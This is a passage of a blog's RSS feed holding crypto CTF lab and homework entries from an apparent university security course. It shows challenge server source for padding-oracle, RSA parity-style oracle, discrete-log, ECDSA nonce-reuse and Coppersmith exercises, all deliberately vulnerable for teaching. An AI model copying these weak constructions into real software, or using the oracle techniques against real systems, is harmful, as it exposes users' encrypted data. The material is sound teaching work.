&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(&lt;span style="color:#ae81ff">1&lt;/span>, len(data) &lt;span style="color:#f92672">+&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">if&lt;/span> data[&lt;span style="color:#f92672">-&lt;/span>i] &lt;span style="color:#f92672">==&lt;/span> &lt;span style="color:#ae81ff">0x80&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> padding_len &lt;span style="color:#f92672">=&lt;/span> i
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">break&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">elif&lt;/span> data[&lt;span style="color:#f92672">-&lt;/span>i] &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">0x00&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">else&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">raise&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">return&lt;/span> data[:&lt;span style="color:#f92672">-&lt;/span>padding_len]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>key &lt;span style="color:#f92672">=&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">16&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(key, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>ct &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>encrypt(pad(FLAG, AES&lt;span style="color:#f92672">.&lt;/span>block_size))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>iv &lt;span style="color:#f92672">=&lt;/span> cipher&lt;span style="color:#f92672">.&lt;/span>iv
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print((iv &lt;span style="color:#f92672">+&lt;/span> ct)&lt;span style="color:#f92672">.&lt;/span>hex())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e"># same encryption&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">try&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inp &lt;span style="color:#f92672">=&lt;/span> bytes&lt;span style="color:#f92672">.&lt;/span>fromhex(input()&lt;span style="color:#f92672">.&lt;/span>strip()) &lt;span style="color:#75715e"># hex style input&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> iv, ct &lt;span style="color:#f92672">=&lt;/span> inp[:&lt;span style="color:#ae81ff">16&lt;/span>], inp[&lt;span style="color:#ae81ff">16&lt;/span>:] &lt;span style="color:#75715e"># get first 16 bytes from input &lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> cipher &lt;span style="color:#f92672">=&lt;/span> AES&lt;span style="color:#f92672">.&lt;/span>new(key, AES&lt;span style="color:#f92672">.&lt;/span>MODE_CBC, iv) 
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt &lt;span style="color:#f92672">=&lt;/span> unpad(cipher&lt;span style="color:#f92672">.&lt;/span>decrypt(ct), AES&lt;span style="color:#f92672">.&lt;/span>block_size)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Well received :)&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">except&lt;/span> &lt;span style="color:#a6e22e">ValueError&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Something went wrong :(&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x05(2023 Lab - LSB)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x052023-lab---lsb/</guid><description>&lt;h1 id="simple-crypto---0x052023-lab---lsb">
 Simple Crypto - 0x05(2023 Lab - LSB)
 &lt;a class="anchor" href="#simple-crypto---0x052023-lab---lsb">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/mqQ2zgK8a0Y?si=GRgtEKGHsCNcKuqU&amp;amp;t=7176"> [edu-ctf 2023] week01 - crypto1 &lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#75715e">#! /usr/bin/python3&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> bytes_to_long, getPrime
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>q &lt;span style="color:#f92672">=&lt;/span> getPrime(&lt;span style="color:#ae81ff">1024&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>n &lt;span style="color:#f92672">=&lt;/span> p &lt;span style="color:#f92672">*&lt;/span> q
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>phi &lt;span style="color:#f92672">=&lt;/span> (p &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>) &lt;span style="color:#f92672">*&lt;/span> (q &lt;span style="color:#f92672">-&lt;/span> &lt;span style="color:#ae81ff">1&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>e &lt;span style="color:#f92672">=&lt;/span> &lt;span style="color:#ae81ff">65537&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>d &lt;span style="color:#f92672">=&lt;/span> pow(e, &lt;span style="color:#f92672">-&lt;/span>&lt;span style="color:#ae81ff">1&lt;/span>, phi)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG &lt;span style="color:#f92672">+&lt;/span> os&lt;span style="color:#f92672">.&lt;/span>urandom(&lt;span style="color:#ae81ff">256&lt;/span> &lt;span style="color:#f92672">-&lt;/span> len(FLAG)))
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">assert&lt;/span> m &lt;span style="color:#f92672">&amp;lt;&lt;/span> n
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>enc &lt;span style="color:#f92672">=&lt;/span> pow(m, e, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(e)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(enc)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">while&lt;/span> &lt;span style="color:#66d9ef">True&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> inp &lt;span style="color:#f92672">=&lt;/span> int(input()&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> pt &lt;span style="color:#f92672">=&lt;/span> pow(inp, d, n)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(pt &lt;span style="color:#f92672">%&lt;/span> &lt;span style="color:#ae81ff">3&lt;/span>)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x06(2023 HW - LFSR)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x062023-hw---lfsr/</guid><description>&lt;h1 id="simple-crypto---0x062023-hw---lfsr">
 Simple Crypto - 0x06(2023 HW - LFSR)
 &lt;a class="anchor" href="#simple-crypto---0x062023-hw---lfsr">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;ul>
&lt;li>&lt;a href="https://www.geeksforgeeks.org/python-list-xor/">Python – List XOR&lt;/a>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> funtools &lt;span style="color:#f92672">import&lt;/span> reduce
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>test_list &lt;span style="color:#f92672">=&lt;/span> [&lt;span style="color:#ae81ff">4&lt;/span>, &lt;span style="color:#ae81ff">6&lt;/span>, &lt;span style="color:#ae81ff">2&lt;/span>, &lt;span style="color:#ae81ff">3&lt;/span>, &lt;span style="color:#ae81ff">8&lt;/span>, &lt;span style="color:#ae81ff">9&lt;/span>]
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>res &lt;span style="color:#f92672">=&lt;/span> reduce(&lt;span style="color:#66d9ef">lambda&lt;/span> x, y: x &lt;span style="color:#f92672">^&lt;/span> y, test_list) &lt;span style="color:#75715e"># The output is 2&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://www.qiniu.com/qfans/qnso-67006518#comments">Numpy矩陣乘法，但不是乘法，而是XOR的元素&lt;/a>
&lt;blockquote>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> numpy &lt;span style="color:#66d9ef">as&lt;/span> np
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m1 &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>array([[&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>m2 &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>array([[&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>], [&lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">0&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>], [&lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>, &lt;span style="color:#ae81ff">1&lt;/span>]])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>mr &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>empty((m2&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">0&lt;/span>], m1&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">1&lt;/span>]), dtype &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>int64)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">for&lt;/span> i &lt;span style="color:#f92672">in&lt;/span> range(mr&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">0&lt;/span>]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> &lt;span style="color:#66d9ef">for&lt;/span> j &lt;span style="color:#f92672">in&lt;/span> range(mr&lt;span style="color:#f92672">.&lt;/span>shape[&lt;span style="color:#ae81ff">1&lt;/span>]):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> mr[i, j] &lt;span style="color:#f92672">=&lt;/span> np&lt;span style="color:#f92672">.&lt;/span>sum(m1[:, j] &lt;span style="color:#f92672">^&lt;/span> m2[i, :])
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(mr)
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/blockquote>
&lt;/li>
&lt;li>&lt;a href="https://pyradise.com/%e4%bd%bf%e7%94%a8-python-%e4%be%86%e8%aa%8d%e8%ad%98%e7%9f%a9%e9%99%a3-915376207187">使用 Python 來認識矩陣&lt;/a>&lt;/li>
&lt;li>&lt;a href="https://ithelp.ithome.com.tw/articles/10203624">[Day07]Learning Numpy - 建立、合併、分割 - CheetSheet for Numpy&lt;/a>&lt;/li>
&lt;li>Sage
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-bash" data-lang="bash">&lt;span style="display:flex;">&lt;span>$ sudo apt install sagemath -y &lt;span style="color:#75715e"># wsl/unix base可以直接安裝，如果是windows要下載sage binary，有1.4GB&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage -n &lt;span style="color:#75715e"># 開起sage notebook，也就是可以用sage kernel運行jupyter&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage &amp;lt;.py/.sage file&amp;gt; &lt;span style="color:#75715e"># 用sage運行腳本&lt;/span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>$ sage &lt;span style="color:#75715e"># 直接開啟sage interactive shell&lt;/span>
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;/li>
&lt;/ul>
&lt;h2 id="recon">
 Recon
 &lt;a class="anchor" href="#recon">#&lt;/a>
&lt;/h2>
&lt;p>這一題和前面的triLFSR不一樣的地方在於他只有一層的LFSR，但他只會每個70個才會給一個state，換句話說我們只能拿到$S_{71&lt;em>0+70},\ S_{71&lt;/em>1+70},\ S_{71&lt;em>2+70},\ S_{71&lt;/em>3+70}&amp;hellip;$(從0開始算)，而前面256個拿到的State最後會和flag進行XOR，只有最後70個是最純粹的State&lt;/p></description></item><item><title>Simple Crypto - 0x07(2023 HW - Oracle)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x072023-hw---oracle/</guid><description>&lt;h1 id="simple-crypto---0x072023-hw---oracle">
 Simple Crypto - 0x07(2023 HW - Oracle)
 &lt;a class="anchor" href="#simple-crypto---0x072023-hw---oracle">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>POA/RSA&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Oracle.py&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import bytes_to_long
from Crypto.Cipher import AES
from random import randbytes
from secret import aes_key, p, q

def pad(m):
 length = 16-len(m) % 16
 return m + chr(length).encode()*length

def unpad(c):
 length = c[-1]
 for char in c[-length:]:
 if char != length:
 raise ValueError
 return c[:-length]

def asymmetric_encryption(message, N, e):
 # encrypt message with RSA
 # message must be 16 bytes
 # padding 100 bytes random value
 padded_message = randbytes(100) + message
 return pow(bytes_to_long(padded_message), e, N)

def symmetric_encryption(message, key):
 # ecrypt message with AES + CBC Mode
 # message can be arbitrary length
 cipher = AES.new(key, AES.MODE_CBC)
 ct = cipher.encrypt(pad(message))
 iv = cipher.iv
 return iv, ct

## Alice: This is my public key.
# p = getPrime(512)
# q = getPrime(512)
N = p * q
e = 65537
print( f&amp;#34;{N = }, {e = }&amp;#34; )
# N = 69214008498642035761243756357619851816607540327248468473247478342523127723748756926949706235406640562827724567100157104972969498385528097714986614165867074449238186426536742677816881849038677123630836686152379963670139334109846133566156815333584764063197379180877984670843831985941733688575703811651087495223
# e = 65537

## Bob: I want to send message to Alice! But my message is too looooooong......
flag = open(&amp;#34;flag.png&amp;#34;, &amp;#34;rb&amp;#34;).read()

## Bob: Oh! I can use symmetric encryption.
iv, ct = symmetric_encryption(flag, aes_key)
encrypted_key = asymmetric_encryption(aes_key, N, e)
encrypted_iv = asymmetric_encryption(iv, N, e)
print( f&amp;#34;{encrypted_key = }&amp;#34; )
print( f&amp;#34;{encrypted_iv = }&amp;#34; )
open(&amp;#34;encrypted_flag.not_png&amp;#34;, &amp;#34;wb&amp;#34;).write(ct)

## Bob: Ha ha! Now no one can decrypt my message except Alice!
# encrypted_key = 65690013242775728459842109842683020587149462096059598501313133592635945234121561534622365974927219223034823754673718159579772056712404749324225325531206903216411508240699572153162745754564955215041783396329242482406426376133687186983187563217156659178000486342335478915053049498619169740534463504372971359692
# encrypted_iv = 35154524936059729204581782839781987236407179504895959653768093617367549802652967862418906182387861924584809825831862791349195432705129622783580000716829283234184762744224095175044663151370869751957952842383581513986293064879608592662677541628813345923397286253057417592725291925603753086190402107943880261658
&lt;/code>&lt;/pre>&lt;p>:::
:::spoiler Alice.py&lt;/p></description></item><item><title>Simple Crypto - 0x08(2023 Lab - dlog)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x082023-lab---dlog/</guid><description>&lt;h1 id="simple-crypto---0x082023-lab---dlog">
 Simple Crypto - 0x08(2023 Lab - dlog)
 &lt;a class="anchor" href="#simple-crypto---0x082023-lab---dlog">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/u4ZVc8PuJC0?si=2wbiGreg_BZQ-dff"> [edu-ctf 2023] week03 - crypto2 &lt;/a>
&lt;a href="https://hackmd.io/@SBK6401/SJobiaxQ3#5-Little-Knowledge-Proof">Cryptography and Network Security – Homework 2 - Little Knowledge Proof&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;div class="highlight">&lt;pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;">&lt;code class="language-python" data-lang="python">&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> Crypto.Util.number &lt;span style="color:#f92672">import&lt;/span> isPrime, bytes_to_long
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">import&lt;/span> os
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#f92672">from&lt;/span> secret &lt;span style="color:#f92672">import&lt;/span> FLAG
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>p &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;give me a prime: &amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> &lt;span style="color:#f92672">not&lt;/span> isPrime(p):
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Do you know what is primes?&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>&lt;span style="color:#66d9ef">if&lt;/span> p&lt;span style="color:#f92672">.&lt;/span>bit_length() &lt;span style="color:#f92672">!=&lt;/span> &lt;span style="color:#ae81ff">1024&lt;/span>:
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> print(&lt;span style="color:#e6db74">&amp;#34;Bit length need to be 1024&amp;#34;&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span> exit(&lt;span style="color:#ae81ff">0&lt;/span>)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>g &lt;span style="color:#f92672">=&lt;/span> int(input(&lt;span style="color:#e6db74">&amp;#34;give me a number: &amp;#34;&lt;/span>)&lt;span style="color:#f92672">.&lt;/span>strip())
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>flag &lt;span style="color:#f92672">=&lt;/span> bytes_to_long(FLAG)
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>
&lt;/span>&lt;/span>&lt;span style="display:flex;">&lt;span>print(&lt;span style="color:#e6db74">&amp;#39;The hint about my secret:&amp;#39;&lt;/span>, pow(g, flag, p))
&lt;/span>&lt;/span>&lt;/code>&lt;/pre>&lt;/div>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x09(2023 Lab - signature)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x092023-lab---signature/</guid><description>&lt;h1 id="simple-crypto---0x092023-lab---signature">
 Simple Crypto - 0x09(2023 Lab - signature)
 &lt;a class="anchor" href="#simple-crypto---0x092023-lab---signature">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://www.youtube.com/live/u4ZVc8PuJC0?si=ychlqdZnGVfFYRAV&amp;amp;t=4075"> [edu-ctf 2023] week03 - crypto2 - ECDSA&lt;/a>&lt;/p>
&lt;blockquote>
&lt;p>&lt;img src="https://hackmd.io/_uploads/ryVbmdMWp.png" alt="" />&lt;/p>
&lt;p>&lt;img src="https://hackmd.io/_uploads/HkJMXOG-T.png" alt="" />&lt;/p>&lt;/blockquote>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from random import randint
from Crypto.Util.number import *
from hashlib import sha256
from ecdsa import SECP256k1
from ecdsa.ecdsa import Public_key, Private_key, Signature
from secret import FLAG

E = SECP256k1
G, n = E.generator, E.order

d = randint(1, n)
k = randint(1, n)
pubkey = Public_key(G, d*G)
prikey = Private_key(pubkey, d)
print(f&amp;#39;P = ({pubkey.point.x()}, {pubkey.point.y()})&amp;#39;)

for _ in range(3):
 print(&amp;#39;&amp;#39;&amp;#39;
1) Request for Signature
2) Check the Permission
3) exit&amp;#39;&amp;#39;&amp;#39;)
 option = input()
 if option == &amp;#39;1&amp;#39;:
 msg = input(&amp;#39;What do you want? &amp;#39;)
 if msg == &amp;#39;Give me the FLAG.&amp;#39;:
 print(&amp;#39;No way!&amp;#39;)
 else:
 h = sha256(msg.encode()).digest()
 # k = k * 1337 % n
 sig = prikey.sign(bytes_to_long(h), k)
 print(f&amp;#39;sig = ({sig.r}, {sig.s})&amp;#39;)

 elif option == &amp;#39;2&amp;#39;:
 msg = &amp;#39;Give me the FLAG.&amp;#39;
 r = input(&amp;#39;r: &amp;#39;)
 s = input(&amp;#39;s: &amp;#39;)
 h = bytes_to_long(sha256(msg.encode()).digest())
 verified = pubkey.verifies(h, Signature(int(r), int(s)))
 if verified:
 print(FLAG)
 else:
 print(&amp;#39;Bad signature&amp;#39;)
 else:
 print(&amp;#34;bye~&amp;#34;)
 break
&lt;/code>&lt;/pre>&lt;p>:::&lt;/p></description></item><item><title>Simple Crypto - 0x10(2023 Lab - coppersmith)</title><link>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/docs/security/course/ntu-cs/crypto/simple-crypto---0x102023-lab---coppersmith/</guid><description>&lt;h1 id="simple-crypto---0x102023-lab---coppersmith">
 Simple Crypto - 0x10(2023 Lab - coppersmith)
 &lt;a class="anchor" href="#simple-crypto---0x102023-lab---coppersmith">#&lt;/a>
&lt;/h1>
&lt;h2 id="background">
 Background
 &lt;a class="anchor" href="#background">#&lt;/a>
&lt;/h2>
&lt;p>&lt;a href="https://ctf-wiki.org/crypto/asymmetric/rsa/rsa_coppersmith_attack/">coppersmith相關攻擊&lt;/a>&lt;/p>
&lt;h2 id="source-code">
 Source code
 &lt;a class="anchor" href="#source-code">#&lt;/a>
&lt;/h2>
&lt;p>:::spoiler Source Code&lt;/p>
&lt;pre tabindex="0">&lt;code class="language-python=" data-lang="python=">from Crypto.Util.number import bytes_to_long, getPrime
from secret import FLAG

assert len(FLAG) &amp;lt;= 30

p = getPrime(1024)
q = getPrime(1024)
n = p * q
e = 3
padding = b&amp;#34;Padding in cryptography is a fundamental concept employed to ensure that data, typically in the form of plaintext, aligns properly with the encryption algorithm&amp;#39;s block size. This process is crucial for symmetric block ciphers like AES and asymmetric encryption algorithms such as RSA. Padding involves adding extra bits to the input data before encryption, making it fit neatly into fixed-size blocks. The primary purpose of padding is to prevent information leakage by ensuring that the last block of plaintext is always complete, even when the original data&amp;#39;s size isn&amp;#39;t a perfect multiple of the block size. Common padding schemes include PKCS#7, PKCS#1 (for RSA), and ANSI X.923, each with its rules for padding and unpadding data. Proper padding ensures data integrity, security, and compatibility within cryptographic protocols.&amp;#34;
pt = padding + FLAG
ct = pow(bytes_to_long(pt), e, n)
print(f&amp;#34;{e = }&amp;#34;)
print(f&amp;#34;{n = }&amp;#34;)
print(f&amp;#34;{ct = }&amp;#34;)
# e = 3
# n = 11548249006448728920152703839381630946834097081458641312395741399152626808167055308830597218237419306363812953570976143239712039037941209800604194908083149885941768218371746741812573578768412807189143962911312361667909189521442378332430658999991458388376075547304981934158525694587528155624390264161508298680598416212224037418377397597560818727159266535257243347737195812548494888452510974912762585150695881388036715559552242157015756455473208463066542053661043988897316002396230791287157322382659981842882278113445574922266102197380093864871418103716702341116793118630092030597784102701252267617442078055768183287429
